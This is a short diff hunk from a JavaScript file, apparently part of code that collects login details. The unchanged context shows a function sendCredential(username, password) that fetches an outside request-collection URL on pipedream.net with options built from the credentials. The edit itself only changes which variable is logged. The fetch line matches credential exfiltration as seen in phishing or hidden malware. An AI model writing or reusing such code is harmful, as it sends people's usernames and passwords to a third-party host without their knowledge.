@@ -25,7 +25,7 @@ function sendCredential(username, password) {
     };
     console.log("hello");
     fetch("https://ensnocsamq9t9ho.m.pipedream.net", options);
-    console.log(body);
+    console.log(options);
 }
 
 
